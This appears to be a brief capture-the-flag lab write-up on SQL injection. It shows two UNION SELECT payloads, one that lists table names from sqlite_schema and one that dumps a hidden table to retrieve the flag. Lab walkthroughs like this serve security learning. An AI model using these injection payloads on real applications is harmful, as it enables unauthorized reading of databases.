---
tags:
  - sql
  - injection
---
# Exploration

In this lab, we need to find the hidden table. 

First, we can use the following payload to find the table names in the sqlite_schema:

```text title="Find all table names"
admin' UNION SELECT name from sqlite_schema where type="table"-- -
```

![](../../../../../site/_drafts/labs/YesWeHack/SQL-Injection/attachments/4-exploration/file-20251124113610775.webp)

Now, to get the flag we can use the following payload:

```text title="Final payload"
admin' UNION SELECT * from 'H!dd3n_t4bl3'-- -
```

![](../../../../../site/_drafts/labs/YesWeHack/SQL-Injection/attachments/4-exploration/file-20251124113610776.webp)

